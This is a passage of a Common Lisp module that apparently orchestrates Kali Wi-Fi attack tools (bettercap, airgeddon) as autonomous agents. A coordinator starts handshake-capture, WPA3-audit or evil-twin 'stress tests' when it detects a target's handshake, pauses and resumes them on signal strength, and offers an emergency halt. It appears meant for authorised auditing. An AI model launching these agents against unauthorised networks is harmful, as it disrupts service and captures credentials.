                       :target-ssid ,target-ssid
                       :attack-mode ,attack-mode
                       :signal-threshold ,signal-threshold
                       :timestamp ,(local-time:now)))
    ;; Step 7: Start the monitor agent
    (run-tool monitor)
    (format t "[WIFI] Air-Monitor-Shadow-Pair spawned.~%")
    (format t "       Coordinator: ~A~%" (agent-id coordinator))
    (format t "       Monitor:     ~A~%" (agent-id monitor))
    (format t "       Stress:      ~A~%" (agent-id stress))
    (format t "       Target:      ~A (~A)~%" target-bssid (or target-ssid "unknown"))
    ;; Return coordinator ID
    (agent-id coordinator)))


(defmethod on-handshake-detected ((coordinator air-stress-coordinator) bssid ssid)
  "Callback: handshake detected -- start targeted stress test.

This method is called (via the monitor agent's callback) when a WPA
handshake or SAE authentication is detected. If the detected BSSID
matches the coordinator's target, the stress test is initiated.

Actions:
  1. Verify BSSID matches TARGET-BSSID (if set).
  2. If not already active, start the stress agent.
  3. Set ACTIVE-P to T, record START-TIME.
  4. Increment HANDSHAKE-COUNT and SESSION-COUNT.
  5. Publish :swarm.wifi.stress-start gossip event.
  6. Log the event.

Parameters:
  COORDINATOR -- The AIR-STRESS-COORDINATOR instance.
  BSSID       -- The MAC address from the detected handshake.
  SSID        -- The network name (may be NIL for hidden networks).

Returns: T if stress test was started, NIL if skipped (wrong BSSID
  or already active)."
  (cond
    ;; Already active -- just log
    ((coordinator-active-p coordinator)
     (incf (coordinator-handshake-count coordinator))
     (format t "[WIFI-COORD] Handshake from ~A detected (~A), stress already active.~%"
             bssid (or ssid "hidden"))
     nil)
    ;; BSSID mismatch (if target is set)
    ((and (coordinator-target-bssid coordinator)
          (not (string-equal bssid (coordinator-target-bssid coordinator))))
     (format t "[WIFI-COORD] Handshake from ~A ignored (target is ~A).~%"
             bssid (coordinator-target-bssid coordinator))
     nil)
    ;; Start the stress test
    (t
     (incf (coordinator-handshake-count coordinator))
     (incf (coordinator-session-count coordinator))
     (setf (coordinator-active-p coordinator) t
           (coordinator-halted-by-signal-p coordinator) nil
           (coordinator-start-time coordinator) (local-time:now))
     ;; Start the stress agent
     (run-tool (coordinator-stress coordinator))
     ;; Publish event
     (publish-message :swarm.wifi.stress-start
                      `(:event :stress-test-started
                        :coordinator ,(agent-id coordinator)
                        :bssid ,bssid
                        :ssid ,(or ssid "hidden")
                        :attack-mode ,(airgeddon-attack-mode
                                       (coordinator-stress coordinator))
                        :timestamp ,(local-time:now)))
     (format t "[WIFI-COORD] *** STRESS TEST STARTED ***~%")
     (format t "             Target: ~A (~A)~%" bssid (or ssid "hidden"))
     (format t "             Mode:   ~A~%" (airgeddon-attack-mode
                                            (coordinator-stress coordinator)))
     t)))


(defmethod on-signal-weak ((coordinator air-stress-coordinator) signal-db)
  "Callback: signal below threshold -- halt stress test.

Called when the signal strength drops below the coordinator's
SIGNAL-THRESHOLD. This conserves power and CPU by pausing the stress
test when conditions are unfavorable.

Actions:
  1. If stress test is active, stop the stress agent.
  2. Set ACTIVE-P to NIL, HALTED-BY-SIGNAL-P to T.
  3. Accumulate runtime into TOTAL-RUNTIME.
  4. Publish :swarm.wifi.stress-halt gossip event.
  5. Log the event with signal reading.

Parameters:
  COORDINATOR -- The AIR-STRESS-COORDINATOR instance.
  SIGNAL-DB   -- The signal strength in dBm (negative number).

Returns: T if stress was halted, NIL if already inactive."
  (if (coordinator-active-p coordinator)
      (progn
        ;; Stop the stress agent
        (stop-tool (coordinator-stress coordinator))
        ;; Update state
        (setf (coordinator-active-p coordinator) nil
              (coordinator-halted-by-signal-p coordinator) t)
        ;; Accumulate runtime
        (when (coordinator-start-time coordinator)
          (incf (coordinator-total-runtime coordinator)
                (local-time:timestamp-difference
                 (local-time:now)
                 (coordinator-start-time coordinator)))
          (setf (coordinator-start-time coordinator) nil))
        ;; Publish halt event
        (publish-message :swarm.wifi.stress-halt
                         `(:event :stress-test-halted
                           :coordinator ,(agent-id coordinator)
                           :reason :weak-signal
                           :signal-db ,signal-db
                           :threshold ,(coordinator-signal-threshold coordinator)
                           :timestamp ,(local-time:now)))
        (format t "[WIFI-COORD] *** STRESS TEST HALTED *** (signal ~D dBm < threshold ~D dBm)~%"
                signal-db (coordinator-signal-threshold coordinator))
        t)
      nil))


(defmethod on-signal-strong ((coordinator air-stress-coordinator) signal-db)
  "Callback: signal recovered -- resume stress test.

Called when the signal strength recovers above the threshold plus
hysteresis margin. Only resumes if the previous halt was signal-based
(not manual or completion).

Actions:
  1. If previously halted by signal, restart the stress agent.
  2. Set ACTIVE-P to T, HALTED-BY-SIGNAL-P to NIL.
  3. Record new START-TIME.
  4. Publish :swarm.wifi.stress-start gossip event.
  5. Log the event.

Parameters:
  COORDINATOR -- The AIR-STRESS-COORDINATOR instance.
  SIGNAL-DB   -- The recovered signal strength in dBm.

Returns: T if stress was resumed, NIL if not applicable."
  (let ((resume-threshold (+ (coordinator-signal-threshold coordinator)
                            (coordinator-hysteresis-db coordinator))))
    (when (and (coordinator-halted-by-signal-p coordinator)
               (>= signal-db resume-threshold))
      ;; Restart the stress agent
      (run-tool (coordinator-stress coordinator))
      ;; Update state
      (setf (coordinator-active-p coordinator) t
            (coordinator-halted-by-signal-p coordinator) nil
            (coordinator-start-time coordinator) (local-time:now))
      ;; Publish resume event
      (publish-message :swarm.wifi.stress-start
                       `(:event :stress-test-resumed
                         :coordinator ,(agent-id coordinator)
                         :signal-db ,signal-db
                         :threshold ,resume-threshold
                         :timestamp ,(local-time:now)))
      (format t "[WIFI-COORD] *** STRESS TEST RESUMED *** (signal ~D dBm >= threshold ~D dBm)~%"
              signal-db resume-threshold)
      t)))


;; ═══════════════════════════════════════════════════════════════════════════
;; Section W.6: Coordinator Strategy -- Autonomous Control Loop
;; ═══════════════════════════════════════════════════════════════════════════

(defmethod air-stress-coordinator-strategy ((coordinator air-stress-coordinator))
  "The strategy function for the Air-Stress-Coordinator.

This function implements the autonomous control loop. It is designed
to be set as the coordinator's STRATEGY slot and called by the
orchestrator's agent loop.

Control loop:
  1. Poll the monitor agent for new findings (handshakes, signal).
  2. Check the stress agent's status (running/crashed/completed).
  3. If handshake found and not active --> ON-HANDSHAKE-DETECTED.
  4. If active and signal weak --> ON-SIGNAL-WEAK.
  5. If halted-by-signal and signal strong --> ON-SIGNAL-STRONG.
  6. If stress agent crashed --> apply restart policy.
  7. Update heartbeat.

Parameters:
  COORDINATOR -- The AIR-STRESS-COORDINATOR instance.

Returns: NIL (runs indefinitely until agent status changes)."
  (let ((monitor (coordinator-monitor coordinator))
        (stress (coordinator-stress coordinator)))
    ;; Step 1: Poll monitor for output
    (when monitor
      (capture-output monitor))
    ;; Step 2: Check stress agent status
    (when stress
      (let ((stress-process (agent-process stress)))
        (cond
          ;; Stress agent crashed -- handle restart
          ((and stress-process
                (not (uiop:process-alive-p stress-process))
                (coordinator-active-p coordinator))
           (warn "[WIFI-COORD] Stress agent ~A crashed. Applying restart policy."
                 (agent-id stress))
           (setf (coordinator-active-p coordinator) nil)
           (setf (coordinator-halted-by-signal-p coordinator) nil))
          ;; Stress completed normally
          ((and stress-process
                (not (uiop:process-alive-p stress-process))
                (coordinator-active-p coordinator))
           (format t "[WIFI-COORD] Stress agent ~A completed.~%"
                   (agent-id stress))
           (setf (coordinator-active-p coordinator) nil)))))
    ;; Step 3: Check for signal-based state transitions
    ;; (These are normally triggered by callbacks, but we poll as backup)
    (when (and monitor (coordinator-active-p coordinator))
      ;; Check latest signal reading from findings
      (let ((latest-signal (find-if (lambda (f)
                                      (eq (getf f :type) :signal-strength))
                                    (agent-findings monitor))))
        (when latest-signal
          (let ((dbm (getf latest-signal :dbm)))
            (when (and dbm (< dbm (coordinator-signal-threshold coordinator)))
              (on-signal-weak coordinator dbm))))))
    ;; Update heartbeat
    (setf (agent-heartbeat coordinator) (local-time:now))
    nil))


;; ═══════════════════════════════════════════════════════════════════════════
;; Section W.7: Interactive REPL Commands -- Human Interface
;; ═══════════════════════════════════════════════════════════════════════════

(defun spawn-bettercap (interface &rest kwargs)
  "REPL command: spawn a bettercap agent and run it.

Creates a BETTERCAP-AGENT with the given interface and keyword
arguments, registers it with the orchestrator, and immediately
launches the tool.

Parameters:
  INTERFACE -- Wireless interface name (e.g., \"wlan1\").
  KWARGS    -- Keyword arguments passed to MAKE-BETTERCAP-AGENT:
               :SCRIPT       -- Caplet script path
               :MODULES      -- Module list (e.g., '(:WIFI.RECON))
               :TARGET-BSSID -- Target AP MAC address

Returns: The BETTERCAP-AGENT instance.

Examples:
  ;; Basic recon
  (spawn-bettercap \"wlan1\" :modules '(:WIFI.RECON :WIFI.ASSOC))

  ;; Targeted monitoring
  (spawn-bettercap \"wlan1\"
                   :modules '(:WIFI.RECON)
                   :target-bssid \"AA:BB:CC:DD:EE:FF\")

  ;; With caplet
  (spawn-bettercap \"wlan1\" :script \"handshake.cap\")

Thread-safety: Creates and launches a new agent. Safe from any thread."
  (let* ((script (getf kwargs :script))
         (modules (getf kwargs :modules))
         (target-bssid (getf kwargs :target-bssid))
         (agent (make-bettercap-agent interface
                                      :script script
                                      :modules modules
                                      :target-bssid target-bssid)))
    ;; Register with orchestrator
    (when *default-orchestrator*
      (register-agent *default-orchestrator* agent))
    (register-kali-agent agent)
    ;; Register in Wi-Fi registry
    (setf (gethash (agent-id agent) *wifi-agent-registry*) agent)
    ;; Launch
    (run-tool agent)
    (format t "[WIFI] Bettercap agent ~A spawned on ~A.~%"
            (agent-id agent) interface)
    agent))


(defun spawn-airgeddon (interface &rest kwargs)
  "REPL command: spawn an airgeddon agent and run it.

Creates an AIRGEDDON-AGENT with the given interface and keyword
arguments, registers it with the orchestrator, and immediately
launches the tool.

Parameters:
  INTERFACE    -- Wireless interface name (e.g., \"wlan1\").
  KWARGS       -- Keyword arguments passed to MAKE-AIRGEDDON-AGENT:
                  :ATTACK-MODE  -- :WPA3-AUDIT, :HANDSHAKE, :EVIL-TWIN
                  :BAND         -- :2.4 or :5
                  :CHANNEL      -- Channel number
                  :TARGET-BSSID -- Target AP MAC
                  :TARGET-SSID  -- Target network name

Returns: The AIRGEDDON-AGENT instance.

Examples:
  ;; WPA3 audit
  (spawn-airgeddon \"wlan1\" :attack-mode :wpa3-audit)

  ;; Handshake capture
  (spawn-airgeddon \"wlan1\"
                   :attack-mode :handshake
                   :channel 6
                   :target-bssid \"AA:BB:CC:DD:EE:FF\")

  ;; 5 GHz audit
  (spawn-airgeddon \"wlan1\"
                   :attack-mode :wpa3-audit
                   :band :5
                   :channel 36)

Thread-safety: Creates and launches a new agent. Safe from any thread."
  (let* ((attack-mode (or (getf kwargs :attack-mode) :wpa3-audit))
         (band (getf kwargs :band))
         (channel (getf kwargs :channel))
         (target-bssid (getf kwargs :target-bssid))
         (target-ssid (getf kwargs :target-ssid))
         (agent (make-airgeddon-agent interface
                                      :attack-mode attack-mode
                                      :band band
                                      :channel channel
                                      :target-bssid target-bssid
                                      :target-ssid target-ssid)))
    ;; Register with orchestrator
    (when *default-orchestrator*
      (register-agent *default-orchestrator* agent))
    (register-kali-agent agent)
    ;; Register in Wi-Fi registry
    (setf (gethash (agent-id agent) *wifi-agent-registry*) agent)
    ;; Launch
    (run-tool agent)
    (format t "[WIFI] Airgeddon agent ~A spawned on ~A (mode: ~A).~%"
            (agent-id agent) interface attack-mode)
    agent))


(defun spawn-wifi-pair (interface target-bssid &rest kwargs)
  "REPL command: spawn Air-Monitor-Shadow-Pair.

High-level wrapper around SPAWN-AIR-MONITOR-SHADOW-PAIR for
interactive use. Creates the full autonomous Wi-Fi stress-testing
subsystem.

Parameters:
  INTERFACE    -- Wireless interface name (e.g., \"wlan1\").
  TARGET-BSSID -- Target AP MAC address.
  KWARGS       -- Optional keyword arguments:
                  :TARGET-SSID      -- Network name for display
                  :SIGNAL-THRESHOLD -- dBm threshold (default -70)
                  :ATTACK-MODE      -- :WPA3-AUDIT (default), :HANDSHAKE

Returns: The coordinator agent ID.

Examples:
  ;; Basic pair for WPA3 audit
  (spawn-wifi-pair \"wlan1\" \"AA:BB:CC:DD:EE:FF\")

  ;; With custom options
  (spawn-wifi-pair \"wlan1\" \"AA:BB:CC:DD:EE:FF\"
                   :target-ssid \"Test-Net\"
                   :signal-threshold -65
                   :attack-mode :handshake)

Thread-safety: Creates new subsystem. Safe from any thread."
  (let ((target-ssid (getf kwargs :target-ssid))
        (signal-threshold (or (getf kwargs :signal-threshold) -70))
        (attack-mode (or (getf kwargs :attack-mode) :wpa3-audit)))
    (spawn-air-monitor-shadow-pair interface target-bssid
                                   :target-ssid target-ssid
                                   :signal-threshold signal-threshold
                                   :attack-mode attack-mode)))


(defun list-wifi-agents ()
  "List all Wi-Fi agents (bettercap, airgeddon, monitor, coordinator).

Scans the Wi-Fi agent registry and prints a formatted table of all
registered Wi-Fi stress-testing agents with their status, type, and
target information.

Returns: A list of all Wi-Fi agent instances.

Example:
  (list-wifi-agents)
  ;; => Prints formatted table and returns agent list.

Thread-safety: Lock-protected read of *wifi-agent-registry*."
  (let ((agents '()))
    ;; Collect from Wi-Fi registry
    (maphash (lambda (id agent)
               (declare (ignore id))
               (push agent agents))
             *wifi-agent-registry*)
    ;; Also collect from Kali registry (bettercap/airgeddon may be there)
    (bt:with-lock-held (*kali-registry-lock*)
      (maphash (lambda (id agent)
                 (declare (ignore id))
                 (when (or (typep agent 'bettercap-agent)
                           (typep agent 'airgeddon-agent)
                           (typep agent 'air-monitor-agent))
                   (unless (member agent agents)
                     (push agent agents))))
               *kali-agent-registry*))
    ;; Print formatted table
    (format t "~%~%")
    (format t "╔═══════════════════════════════════════════════════════════════════════════╗~%")
    (format t "║                     WIFI STRESS-TESTING AGENTS                            ║~%")
    (format t "╠═══════════════════════════════════════════════════════════════════════════╣~%")
    (format t "║ ~10A ~12A ~10A ~30A ║~%"
            "TYPE" "ID" "STATUS" "TARGET")
    (format t "╠═══════════════════════════════════════════════════════════════════════════╣~%")
    (dolist (agent (reverse agents))
      (let ((type (type-of agent))
            (id (agent-id agent))
            (status (agent-status agent))
            (target (or (agent-target agent) "N/A")))
        (format t "║ ~10A ~12A ~10A ~30A ║~%"
                (subseq (format nil "~A" type) 0 (min 10 (length (format nil "~A" type))))
                (subseq (format nil "~A" id) 0 (min 12 (length (format nil "~A" id))))
                status
                (subseq target 0 (min 30 (length target))))))
    (format t "╚═══════════════════════════════════════════════════════════════════════════╝~%")
    (format t "  Total: ~D Wi-Fi agent(s)~%~%" (length agents))
    (reverse agents)))


(defun halt-wifi-stress ()
  "Emergency: halt all Wi-Fi stress tests.

This is the emergency stop function. It:
  1. Halts all active AIR-STRESS-COORDINATOR instances.
  2. Stops all AIRGEDDON-AGENT processes.
  3. Stops all AIR-MONITOR-AGENT processes.
  4. Stops all BETTERCAP-AGENT processes.
  5. Publishes emergency halt event to gossip.

This function is the Wi-Fi equivalent of KILL-ALL-TOOLS but scoped
to Wi-Fi stress-testing agents only. It does NOT affect other Kali
agents (nmap, sqlmap, etc.).

Returns: Count of agents halted.

Example:
  ;; Emergency stop all Wi-Fi testing
  (halt-wifi-stress)

Thread-safety: Lock-protected iteration. Safe from any thread.
Side effects: Stops processes, updates agent status."
  (format t "[WIFI] *** EMERGENCY HALT *** Stopping all Wi-Fi stress tests...~%")
  (let ((halted 0))
    ;; Halt coordinators (stop their stress agents)
    (maphash (lambda (id coordinator)
               (declare (ignore id))
               (when (typep coordinator 'air-stress-coordinator)
                 (when (coordinator-active-p coordinator)
                   (ignore-errors
                     (stop-tool (coordinator-stress coordinator)))
                   (setf (coordinator-active-p coordinator) nil)
                   (incf halted))))
             *wifi-agent-registry*)
    ;; Halt all Wi-Fi agents from Kali registry
    (bt:with-lock-held (*kali-registry-lock*)
      (maphash (lambda (id agent)
                 (declare (ignore id))
                 (when (or (typep agent 'bettercap-agent)
                           (typep agent 'airgeddon-agent)
                           (typep agent 'air-monitor-agent))
                   (when (and (agent-process agent)
                              (uiop:process-alive-p (agent-process agent)))
                     (ignore-errors (stop-tool agent))
                     (incf halted))))
               *kali-agent-registry*))
    ;; Publish emergency halt event
    (publish-message :swarm.wifi.stress-halt
                     `(:event :emergency-halt-all
                       :agents-halted ,halted
                       :timestamp ,(local-time:now)))
    (format t "[WIFI] Emergency halt complete. ~D agent(s) stopped.~%" halted)
    halted))


;; ═══════════════════════════════════════════════════════════════════════════
;; Section W.8: Wi-Fi Subsystem Initialization & Status
;; ═══════════════════════════════════════════════════════════════════════════

(defun init-wifi-subsystem ()
  "Initialize the Wi-Fi stress-testing subsystem.

Registers Wi-Fi gossip topics, verifies tool availability (bettercap,
airgeddon, tshark), and logs initialization status. Should be called
after INIT-KALI-SUBSYSTEM.

Returns: T if at least one Wi-Fi tool is available.

Side effects:
  -- Registers Wi-Fi gossip topics.
  -- Prints availability status.

Example:
  (init-wifi-subsystem)"
  (format t "~&[WIFI] Initializing Wi-Fi stress-testing subsystem...~%")
  ;; Register Wi-Fi gossip topics
  (dolist (topic *wifi-gossip-topics*)
    (register-topic (string-downcase (symbol-name topic))
                    (lambda (msg)
                      (format t "~&[WIFI-GOSSIP] ~A: ~A~%"
                              topic (subseq (format nil "~A" msg)
                                            0 (min 150 (length (format nil "~A" msg))))))))
  (format t "[WIFI] Registered ~D Wi-Fi gossip topics.~%" (length *wifi-gossip-topics*))
  ;; Verify tool availability
  (let* ((wifi-tools '("bettercap" "airgeddon" "tshark" "airodump-ng"))
         (found 0))
    (dolist (tool wifi-tools)
      (if (find-kali-binary tool)
          (progn (incf found)
                 (format t "[WIFI] Tool available: ~A~%" tool))
          (format t "[WIFI] Tool missing: ~A~%" tool)))
    (when (> found 0)
      (format t "[WIFI] Subsystem ready (~D/~D tools).~%" found (length wifi-tools))
      (format t "[WIFI] Commands: (spawn-bettercap ...), (spawn-airgeddon ...),~%")
      (format t "              (spawn-wifi-pair ...), (list-wifi-agents), (halt-wifi-stress)~%")
      t)))


(defun wifi-subsystem-status ()
  "Return a comprehensive status report of the Wi-Fi subsystem.

Returns a plist containing:
  :active-coordinators -- Count of active stress coordinators.
  :active-stress-tests -- Count of currently running stress tests.
  :total-handshakes    -- Total handshakes detected.
  :total-sessions      -- Total stress test sessions.
  :wifi-agents         -- Count of Wi-Fi agents in registry.
  :signal-thresholds   -- List of (coordinator-id . threshold) pairs.

Example:
  (wifi-subsystem-status)
  ;; => (:ACTIVE-COORDINATORS 1 :ACTIVE-STRESS-TESTS 1 ...)

Thread-safety: Lock-protected reads."
  (let ((coordinators 0)
        (active-tests 0)
        (total-handshakes 0)
        (total-sessions 0)
        (wifi-agents 0)
        (thresholds '()))
    ;; Scan Wi-Fi registry
    (maphash (lambda (id agent)
               (declare (ignore id))
               (incf wifi-agents)
               (when (typep agent 'air-stress-coordinator)
                 (incf coordinators)
                 (when (coordinator-active-p agent)
                   (incf active-tests))
                 (incf total-handshakes (coordinator-handshake-count agent))
                 (incf total-sessions (coordinator-session-count agent))
                 (push (cons (agent-id agent)
                             (coordinator-signal-threshold agent))
                       thresholds)))
             *wifi-agent-registry*)
    `(:active-coordinators ,coordinators
      :active-stress-tests ,active-tests
      :total-handshakes ,total-handshakes
      :total-sessions ,total-sessions
      :wifi-agents ,wifi-agents
      :signal-thresholds ,(nreverse thresholds))))


;; ═══════════════════════════════════════════════════════════════════════════
;; WIFI STRESS-TESTING MODULE -- Export Summary
;; ═══════════════════════════════════════════════════════════════════════════
;;
;; CLASSES (4 new):
;;   bettercap-agent        -- Wi-Fi recon, deauth, handshake capture
;;   airgeddon-agent        -- WPA3 auditing, controlled stress testing
;;   air-monitor-agent      -- Monitor-mode frame capture with callbacks
;;   air-stress-coordinator -- Autonomous monitor-stress coordinator
;;
;; CONSTRUCTORS (4 new):
;;   make-bettercap-agent, make-airgeddon-agent,
;;   make-air-monitor-agent, spawn-air-monitor-shadow-pair
;;
;; METHODS:
;;   run-tool :before (bettercap-agent)     -- Policy gatekeeper
;;   parse-findings :after (bettercap-agent)   -- AP/handshake/client parsing
;;   parse-findings :after (airgeddon-agent)   -- Progress/handshake/SAE parsing
;;   parse-findings :after (air-monitor-agent) -- EAPOL/beacon/auth parsing
;;   on-handshake-detected (coordinator)    -- Start stress test
;;   on-signal-weak (coordinator)           -- Halt stress test
;;   on-signal-strong (coordinator)         -- Resume stress test
;;   air-stress-coordinator-strategy        -- Autonomous control loop
;;
;; REPL COMMANDS (5 new):
;;   spawn-bettercap, spawn-airgeddon, spawn-wifi-pair,
;;   list-wifi-agents, halt-wifi-stress
;;
;; SUBSYSTEM MANAGEMENT:
;;   init-wifi-subsystem, wifi-subsystem-status
;;
;; SPECIAL VARIABLES:
;;   *wifi-agent-registry*, *wifi-policy-gatekeeper-enabled*,
;;   *wifi-admin-passphrase*, *wifi-gossip-topics*,
;;   *wifi-default-interface*, *wifi-handshake-callback-registry*
;;
;; ═══════════════════════════════════════════════════════════════════════════
;;                    END OF WIFI STRESS-TESTING MODULE
;;                               END OF KALI-INTERFACE.LISP
;; ═══════════════════════════════════════════════════════════════════════════
